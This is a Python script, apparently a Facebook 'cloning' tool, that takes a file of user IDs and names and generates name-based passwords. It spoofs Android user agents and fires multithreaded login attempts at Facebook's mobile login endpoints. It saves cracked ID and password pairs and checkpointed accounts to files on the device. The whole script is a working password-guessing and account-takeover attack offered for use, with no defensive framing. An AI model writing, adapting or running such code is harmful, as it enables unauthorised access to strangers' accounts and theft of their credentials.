#SCTIPT OPEN SOURCE BY KRS
#GITHUB : github.com/TEAM-KRS

from os import path
import os,base64,zlib,pip,urllib,time,random,requests
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
        os.system('git pull')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')

ugen=[]
ugen=[]
useragent=[]
uaku2=[]
ugen2=[]
ugen=[]
aqib_ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-5-1-5)","Dalvik/2.1.0 (Linux; U; Android 12; RMX2111 Build/SP1A.210812.016) baiduboxapp/13.33.0.11 (Baidu; P1 12) SP-engine/2.71.0 baiduboxapp/13.33.0.11 (Baidu; P1 12) dumedia/7.41.52.13","Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30i 5G Build/RKQ1.200826.002)","Dalvik/2.1.0 (Linux; U; Android 12; I1927 Build/SP1A.210812.003)","Dalvik/2.1.0 (Linux; U; Android 12; Tab 12 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g42 Build/S2SE32.28-13-1)","Dalvik/2.1.0 (Linux; U; Android 12; Nokia G11 Build/SP1A.210812.016; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 13; I2203 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 6.0; V730 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; Redmi Note 5 Pro Build/SQ3A.220705.003)","Dalvik/2.1.0 (Linux; U; Android 12; Element 5 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; Nokia G11 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 10.0; pop Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K10C Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; BOOKEEN Build/OPM1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 12; M10L Pro Build/S00812)","Dalvik/2.1.0 (Linux; U; Android 11; Hisense Infinity H60 Lite Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 12; 2109119DI Build/SKQ1.211006.001) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; 2201117TY Build/SKQ1.211103.001) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 12; CPH2357 Build/SP1A.210812.016) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 11; M2010J19SY Build/RKQ1.201004.002) VD/235","Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G Build/RPNS31.Q1-51-40-16-3)","Dalvik/2.1.0 (Linux; U; Android 12; moto g 5G (2022) Build/S2SA32.1-54-17)","Dalvik/2.1.0 (Linux; U; Android 13; SM-F700U Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; 6002D Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one vision plus Build/PPIS29.65-51-7)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230505.002.A1)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Aquaris M10 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; CRT-LX2 Build/HONORCRT-L32)","Dalvik/2.1.0 (Linux; U; Android 10; 9060G Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 9.0; MF-MQX02 Build/NHG47K)","Dalvik/2.1.0 (Linux; U; Android 12; X20 Build/X20)","Dalvik/2.1.0 (Linux; U; Android 13; M2103K19C Build/TP1A.220624.014)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; RIDGE 4G Build/KTU84P)","Dalvik/2.1.0 (Linux; U; Android 9; ASUS_I003DD Build/PI)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A245F Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; Mediatek MT8173 Chromebook Build/R113-15393.48.0)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ2A.230505.002.A1)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A546W Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 10; Shanling M3 Ultra Build/QKQ1.201124.002)","Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-129)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60)s Build/S3RLS32.114-25-9)","Dalvik/2.1.0 (Linux; U; Android 12; ZTE A2023G Build/SKQ1.220213.001)","Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R113-15393.48.0)","Dalvik/2.1.0 (Linux; U; Android 12; moto e32 Build/STC32.60-74)","Dalvik/2.1.0 (Linux; U; Android 13; SH-52C Build/S202H)","Dalvik/2.1.0 (Linux; U; Android 10; BQ-5533G Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 10; Bphone B86 Build/QKQ1.200329.002)","Dalvik/2.1.0 (Linux; U; Android 10; EA-94613 Build/QQ2A.200305.004.A1)","Dalvik/2.1.0 (Linux; U; Android 12; I9_Plus_WIFI_ROW Build/SQ3A.220605.009.B1)","Dalvik/2.1.0 (Linux; U; Android 10; RAVOZ Z5 Lite Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 9; AFTALMO Build/PS7633.3445N)","Dalvik/2.1.0 (Linux; U; Android 10; X410 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 13; WP22 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; Mi A2 Lite Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 9; KFMUWI Build/PS7327.3326N) C4oD_Android/9.6.1 (uid:2091d5fa-c4d1-47f9-9cf1-761e4a018683; tid:-; did:Amazon_KFMUWI_28;)","Dalvik/2.1.0 (Linux; U; Android 9; KFTRWI Build/PS7328.3433N) C4oD_Android/9.6.1 (uid:12e6e155-6b52-4a7b-94c9-ff93795e5c2f; tid:-; did:Amazon_KFTRWI_28;)","Dalvik/2.1.0 (Linux; Android 7.1.2; Redmi 6 Build/173vz; wv) AppleWebKit","Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N09)","Dalvik/2.1.0 (Linux; U; Android 12; moto g22 Build/STAS32.79-77-28-50-4)","Dalvik/2.1.0 (Linux; U; Android 13; FNE-NX9 Build/HONORFNE-N29)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2197 Build/TP1A.220905.001; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 11; dedede Build/R113-15393.48.0)","Dalvik/2.1.0 (Linux; U; Android 11; moto g go Build/RRHGS31.Q3-37-43-43-5-4-17)","Dalvik/2.1.0 (Linux; U; Android 10; SM-A105M Build/HUAWEIELS-N29)","Dalvik/2.1.0 (Linux; U; Android 12; RBN-NX3 Build/HONORRBN-N03)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 20 lite Build/S2RKS32.92-11-21-14)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; 1803 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 9; Flix TV Box Build/PI)","Dalvik/2.1.0 (Linux; U; Android 9; kukui Build/R113-15393.48.0)","Dalvik/2.1.0 (Linux; U; Android 13; FP4 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 12; T507D Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; V2059 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; Acer Chromebook R13 (CB5-312T) Build/R113-15393.48.0)","Dalvik/2.1.0 (Linux; U; Android 12; T776H Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; Logicom La Tab 129 Build/0913)","Dalvik/2.1.0 (Linux; U; Android 11; Mi Max Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; SHARK KSR-A0 Build/KASE2110270CN00MP7)","Dalvik/2.1.0 (Linux; U; Android 11; ARCTIC Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 6.0; Mate60 Pro Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; X88Pro 13 Build/TQ1A.230105.002.A1)","Dalvik/2.1.0 (Linux; U; Android 12; SM-G525N Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 neo Build/S3SSMS32.34-131-3)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-14-3)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 7.0; CM7000plus Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230405.003.G1)","Dalvik/2.1.0 (Linux; U; Android 10; PH4003 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AI Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH2 Build/QTG3.200305.006.S36)","Dalvik/2.1.0 (Linux; U; Android 11; Hammer_Blade_5G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 11; 5164A Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TQ2B.230505.005.A1)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; 404KC Build/110.1.2e10)","Dalvik/2.1.0 (Linux; U; Android 9; Infinix X653C Build/PPR1.180610.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; SM-F936B Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-C115M Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 10; X526 Build/QD4A.200905.003)",])
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU       

logo=("""   
\033[1;35m  **         *******    ******** ******** ******** *******  
\033[1;35m /**        **/////**  **////// /**///// /**///// /**////** 
\033[1;35m /**       **     //**/**       /**      /**      /**   /** 
\033[1;35m /**      /**      /**/*********/******* /******* /*******  
\033[1;35m /**      /**      /**////////**/**////  /**////  /**///**  
\033[1;35m /**      //**     **        /**/**      /**      /**  //** 
\033[1;35m /******** //*******   ******** /********/********/**   //**
////////   ///////   ////////  //////// //////// //     // 
\t\t\t   \033[1;33mMENTAL
\033[1;32m-------------------------------------------
\033[1;35m   \033[1;32mCREATED BY   :  \033[1;32mLosser 
\033[1;35m   \033[1;33mFACEBOK      : \033[1;33m NOI BATAO GA 
\033[1;36m   \033[1;35mGITHUB       :  \033[1;35m NOI HE
\033[1;32m   \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m   \033[1;35mTEAM         :  \033[1;35mAlone 
\033[1;34m   \033[1;32mTOOL VIRSION :  \033[1;32m0.1
\033[1;32m-------------------------------------------""")

def linex():
        print("\033[1;32m-------------------------------------------")
def clear():
        os.system(f'clear')
        print(logo)
loop=0
oks=[]
cps=[]
krk=[]
id=[]
tokenku=[]
os.system('git pull')





def KRRSS():
	clear()
	
	print(f"\n \033[1;37m[\033[1;32m1\033[1;37m] FILE CLONEING ")
	#print(f" [\033[1;32m2\033[1;37m] RANDOM CLONE")
	print(f" [\033[1;31m0\033[1;37m] Exit")
	me=input(f'\n\n [\033[1;32m•\033[1;37m] Choice : ')
	
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f'\n [\033[1;32m•\033[1;37m] FILE PATH \033[1;32m: ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' [\033[1;32mX\033[1;37m] File location Not Found ')
			exit()
		clear();print(f'\n [\033[1;31m1\033[1;37m] Method \033[1;32m1 \n [\033[1;31m2\033[1;37m] Method \033[1;32m2 ')
		mthd=input(f'\n [\033[1;32m•\033[1;37m] Salect : ')
		plist=[]
		try:
			clear();ps_limit = int(input(f'\n [\033[1;32m?\033[1;37m] How Many Passwords Do You Want To Add \033[1;33m: '))
		except:
			ps_limit =1
		clear();print(f'\n [\033[1;32m•\033[1;37m] Example: \033[1;36mfirst last,firtslast,first123 \033[1;37m\n')
		for i in range(ps_limit):
			plist.append(input(f' [\033[1;32m•\033[1;37m] Put password {i+1} :  '))
		clear()
		cx=('y')
		if cx in ['n','N','no','NO','2']:
			krk.append(f'n')
		else:
			krk.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f'\n Total Account : \033[1;32m{total_ids} ')
			print(f"\033[1;36m Use Flight Mode For Speed Up\033[1;37m")
			linex()
			for user in fo:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(m1,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(m2,ids,names,passlist)
				elif mthd in ['3','03']:
					crack_submit.submit(m3,ids,names,passlist)
				elif mthd in ['4','04']:
					crack_submit.submit(m4,ids,names,passlist)
				
				
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [KRS] \033[1;36m|\033[1;37m %s \033[1;36m|\033[1;37m OK \033[1;36m|\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(aqib_ua)
                        head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': aqib_ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        KRRSS=session.cookies.get_dict().keys()
                        if "c_user" in KRRSS:
                                
                                print(f'\r\r\033[1;32m [KRS\033[1;36m-\033[1;37m\033[1;32mOK] %s \033[1;36m|\033[1;37m\033[1;32m %s'%(ids,pas))
                        
                        
                                open(f'/sdcard/KRS_OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                
                                break
                        
                        elif 'checkpoint' in KRRSS:
                                if 'y' in krk:
                                        print(f'\r\r\033[1;91m [KRS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/KRS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(10)
        loop+=1
                        

def m2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [KRS] \033[1;36m|\033[1;37m %s \033[1;36m|\033[1;37m OK \033[1;36m|\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(aqib_ua)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': aqib_ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        KRRSS=session.cookies.get_dict().keys()
                        if "c_user" in KRRSS:
                                
                                print(f'\r\r\033[1;32m [KRS\033[1;36m-\033[1;37m\033[1;32mOK] %s \033[1;36m|\033[1;37m\033[1;32m %s'%(ids,pas))
                                
                                open(f'/sdcard/KRS_OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                
                                break
                        
                        elif 'checkpoint' in KRRSS:
                                if 'y' in krk:
                                        print(f'\r\r\033[1;91m [KRS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/KRS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(10)
        loop+=1


KRRSS()
